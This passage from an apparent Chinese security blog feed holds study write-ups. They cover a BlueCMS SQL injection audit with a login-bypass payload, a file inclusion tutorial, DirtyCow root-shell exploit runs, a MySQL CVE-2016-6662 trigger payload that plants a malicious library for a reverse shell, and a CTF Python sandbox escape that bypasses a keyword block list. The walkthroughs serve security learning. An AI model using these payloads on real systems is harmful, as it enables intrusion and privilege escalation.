&#125;</span><br></pre></td></tr></table></figure><p>继续跟进check_admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里发生了一次登陆验证，可以通过宽字节注入来做万能密码登陆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=admin%65%27+or+1%3D1%23&amp;pwd=123</span><br></pre></td></tr></table></figure><p><img src="../../../../img/bluecms_code_review/bluecms_login_success.png" alt=""></p><h2 id="存入ip造成注入"><a href="#存入ip造成注入" class="headerlink" title="存入ip造成注入"></a>存入ip造成注入</h2><p>在common.inc.php中可以找到getip()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看调用他的位置<br><img src="../../../../img/bluecms_code_review/bluecms_getip.png" alt=""></p><p>online_ip调用处<br><img src="../../../../img/bluecms_code_review/bluecms_online_ip.png" alt=""></p><p>看看guest_book.php处存在insert注入，并且可以通过覆盖后面的content，造成数据回显。通过xff传入注入语句或者client ip传入。</p><p><img src="../../../../img/bluecms_code_review/bluecms_ip_injection.png" alt=""><br>结果可以看到<br><img src="../../../../img/bluecms_code_review/bluecms_ip_results.png" alt=""></p><p>其他位置的注入，不能回显，就不分析了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体来说，直接可以grep到<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>的cms，审计起来会比较轻松。可以先从入口看起，将common,config等文件看一遍，再查找危险函数，数据入口就可审计出几个漏洞来。bluecms暂时审计到这一步，主要找的是SQL注入的漏洞。其他漏洞打算准备另外一套cms来审计:)</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】文件包含漏洞详解</title>
      <link href="/2016/12/19/old-file-include/"/>
      <url>/2016/12/19/old-file-include/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>很久没有归纳总结知识点了，学了那么多总感觉那么零散，所以准备开始总结这一系列的漏洞详解。一方面是总结一方面也是复习。这篇主要总结一下文件包含漏洞。<br><a id="more"></a></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>由于在Web应用开发的过程中，大量代码是可以重复使用的，为了方便使用结合开发语言(如php)的便利，包含重复利用的代码，如果在包含过程中，路径或请求的url可控且没有做任何的安全处理，就容易发生文件包含漏洞。<br>文件包含漏洞包括</p><ul><li>本地文件包含</li><li>远程文件包含</li></ul><p>下面主要讲的文件包含在php中的应用，毕竟php是世界上最好的语言，23333333<br>ps:其他语言，遇到了再补充</p><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>这里先讲一下远程文件包含RFI（Remote File Include），顾名思义，远程文件包含就是，Web应用程序请求远程的资源，进行一个包含利用。一些猥琐的过马一句话木马就是利用这种方式进行一个恶意代码的包含。<br>在php中造成远程文件包含，首先需要配置文件中<code>allow_url_include=On</code>默认不开启，以及远程读取文件<code>allow_url_fopen=On</code>，满足这些条件，我们再来看看有哪些触发远程文件包含的php函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取远程文件内容</span></span><br><span class="line">fopen()</span><br><span class="line">copy()</span><br><span class="line">file_get_content()</span><br><span class="line"><span class="comment">//包含远程文件代码</span></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="comment">//可能会有遗漏，小伙伴如果知道还有其他的可以email我：）</span></span><br></pre></td></tr></table></figure></p><p>前面读取远程文件内容，可能会出现在上传头像处，存取远程头像。<br>后者危害可能更大，直接包含恶意代码执行导致任意代码执行。</p><h2 id="远程包含支持的协议"><a href="#远程包含支持的协议" class="headerlink" title="远程包含支持的协议"></a>远程包含支持的协议</h2><p>在满足配置文件的要求下，使用php支持使用<code>http</code>、<code>https</code>(存在openssl扩展时)、<code>ftp</code>、<code>php://input</code>、</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CVE-2016-5195】Dirtycow</title>
      <link href="/2016/10/26/old-dirtycow-cve-2016-5195/"/>
      <url>/2016/10/26/old-dirtycow-cve-2016-5195/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近出来的dirtycow，影响版本:Linux kernel &gt;= 2.6.22（2007年发行，到今年10月18日才修复）,用网上的EXP试了一下，记录一下过程<br><a id="more"></a></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="https-www-exploit-db-com-exploits-40616"><a href="#https-www-exploit-db-com-exploits-40616" class="headerlink" title="https://www.exploit-db.com/exploits/40616/"></a><a href="https://www.exploit-db.com/exploits/40616/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40616/</a></h3><p>这个EXP是exploitdb上的，但是容易造成系统崩溃，成功后会返回一个root权限的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./dirtycow</span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up /usr/bin/passwd.. to /tmp/bak</span><br><span class="line">Size of binary: 47032</span><br><span class="line">Racing, this may take a while..</span><br><span class="line">thread stopped</span><br><span class="line">thread stopped</span><br><span class="line">/usr/bin/passwd is overwritten</span><br><span class="line">Popping root shell.</span><br><span class="line">Don&apos;t forget to restore /tmp/bak</span><br><span class="line">root@ubuntu14:/home/okami# id</span><br><span class="line">uid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)</span><br><span class="line">root@ubuntu14:/home/okami# whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu14:/home/okami#</span><br></pre></td></tr></table></figure><h3 id="https-github-com-scumjr-dirtycow-vdso"><a href="#https-github-com-scumjr-dirtycow-vdso" class="headerlink" title="https://github.com/scumjr/dirtycow-vdso"></a><a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></h3><p>这个EXP不会出现系统崩溃，但是作者本人说不适用于所有linux版本，不过试验了一下，ubuntu14 16 centOS7都可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./0xdeadbeef</span><br><span class="line">[*] exploit: patch 1/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] exploit: patch 2/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] waiting for reverse connect shell...</span><br><span class="line">[*] enjoy!</span><br><span class="line">[*] restore: patch 2/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">[*] restore: patch 1/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><p>注意这里有一步是waiting for reverse connect shell…，需要一点时间，成功后有root权限的shell</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CVE-2016-6662】MYSQL提权分析</title>
      <link href="/2016/09/18/old-cve-2016-6663-mysql-exp/"/>
      <url>/2016/09/18/old-cve-2016-6663-mysql-exp/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>几天前出了mysql本地提权的0day，虽然现在官方已经出了补丁，但是受影响的主机还是挺多的。跟进操作一遍：）</p><a id="more"></a><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL  &lt;= 5.7.15       远程代码执行/ 提权 (0day)</span><br><span class="line">        5.6.33</span><br><span class="line">        5.5.52</span><br><span class="line"></span><br><span class="line">Mysql分支的版本也受影响,包括：</span><br><span class="line">    MariaDB</span><br><span class="line">    PerconaDB</span><br></pre></td></tr></table></figure><h1 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h1><p>这次实验主要使用docker搭建环境，有需要的同学可以pull我的库玩<a href="https://hub.docker.com/r/0kami/vulevn/tags/" target="_blank" rel="noopener">0kami/vulenv:cve-2016-6663</a><br>实验主要从attacker的角度入手，预先拥有的权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql 账户拥有file权限 bob/bob</span><br><span class="line">exp mysql_hookandroot_lib.c</span><br><span class="line">mysql-server-5.6</span><br><span class="line">my.cnf可被mysql组改写写</span><br></pre></td></tr></table></figure></p><p>先查看一下版本信息<br><img src="../../../../img/cve-2016-6662/pic1.png" alt=""><br>将<code>/etc/mysql/my.cnf</code>权限修改掉<br><img src="../../../../img/cve-2016-6662/pic2.png" alt=""><br>创建bob用户，并赋予file，select，insert权限，创建用于实验的数据库activedb和表active_table<br><img src="../../../../img/cve-2016-6662/pic3.png" alt=""><br><img src="../../../../img/cve-2016-6662/pic4.png" alt=""><br>将exp先写入tmp目录，并编译成so文件，需要修改一下ip，port和my.cnf的位置<br><img src="../../../../img/cve-2016-6662/pic5.png" alt=""><br><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl</code><br><img src="../../../../img/cve-2016-6662/pic6.png" alt=""><br>最后一步就是准备一下active_table的触发器了，我们可以现在自己电脑上root用户权限下生成一个tragger<br><img src="../../../../img/cve-2016-6662/pic7.png" alt=""><br>在activedb数据下会生成一个触发器<br><img src="../../../../img/cve-2016-6662/pic8.png" alt=""><br>到此位置我们所有的准备工作都做好了。让我们用bob用户来弹个shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;TYPE=TRIGGERS\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\nAFTER INSERT\n   ON `active_table` FOR EACH ROW\nBEGIN\n   DECLARE void varchar(550);\n   set global general_log_file=\\\&apos;/etc/mysql/my.cnf\\\&apos;;\n   set global general_log = on;\n   select \&quot;\n[mysqld]\nmalloc_lib=\\\&apos;/tmp/mysql_hookandroot_lib.so\\\&apos;\n\&quot; INTO void;   \n   set global general_log = off;\nEND&apos;\nsql_modes=1073741824\ndefiners=&apos;root@localhost&apos;\nclient_cs_names=&apos;latin1&apos;\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;;</span><br></pre></td></tr></table></figure></p><p>用bob的用户写入文件产生一个触发器，这个触发器当产生insert时触发<br><img src="../../../../img/cve-2016-6662/pic9.png" alt=""><br>来查看一下，执行后的<code>/etc/mysql/my.cnf</code>的内容<br><img src="../../../../img/cve-2016-6662/pic10.png" alt=""><br>重启一下数据库，反弹一个shell<br>发现可写的my.cnf会被忽略？？？不知道为什么（难道打补丁了？），不知道5.5的情况会怎么样，所以先把my.cnf的权限改回来744<br><img src="../../../../img/cve-2016-6662/pic11.png" alt=""><br><img src="../../../../img/cve-2016-6662/pic12.png" alt=""><br>成功反弹一个shell，这边返回的一个shell是mysql权限的 是因为我测试的环境mysqld_safe是以mysql权限运行的，所以弹出来的权限是mysql的，但是如果mysqld_safe是以root权限运行，那么反弹的shell就是root权限的，造成提权。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>测试环境搭建还有利用过程还是出现了很多问题，可写的my.cnf会被忽略载入（不知道是不是因为修复过的原因），triggers的利用（可以同样利用在拥有file权限的情况下提升权限，这个到时候再深入学习一下）</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】python sandbox escape</title>
      <link href="/2016/09/16/old-python-sandbox-escape/"/>
      <url>/2016/09/16/old-python-sandbox-escape/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>前几天的华山杯出了一道python的沙盒逃逸，感觉挺有意思的。在网上搜索了一下，发现很早就出过这种类型的题，源码都差不多。学习了一下思路，这里总结一下：）</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>沙盒源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [  </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()  </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)  </span><br><span class="line">targets.remove(<span class="string">'print'</span>)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:<span class="comment"># 去除所有内置函数除print raw_input</span></span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure></p><p>不能出现banned列表中的字符，但是需要读取flag文件内容。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>绕过前面的限制，我们来一步一步看payload</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &apos;dict&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br></pre></td></tr></table></figure><p>首先python的内置对象有一个<strong>class</strong>属性来存储类型，我们往上找他的父类使用<strong>base</strong>属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性<strong>subclasses</strong>来查看object的子类（包括所有的内置类）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]</span><br></pre></td></tr></table></figure></p><p>回到我们的主要目的上，我们需要读取flag文件中的内容，在这些子类中有哪些是可以用来读取文件内容的呢？答案是file子类，首先查找一下file子类的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p>这样我们就可以通过这个来建立一个file类的别名读文件啦：）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read()</span><br></pre></td></tr></table></figure></p><p>？？？没有任何内容打印出来，但是他没有报错说明存在flag.txt文件，我们尝试用他给的print函数来打印<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">No bueno</span><br></pre></td></tr></table></figure></p><p>我们得想其他办法来获取shell。通过上面的思路，我们需要找一个子类他能调用os模块，这里用到了<code>warnings.catch_warnings</code>类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()</span><br><span class="line">[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;]</span><br></pre></td></tr></table></figure></p><p>接下来再找<code>linecache</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; 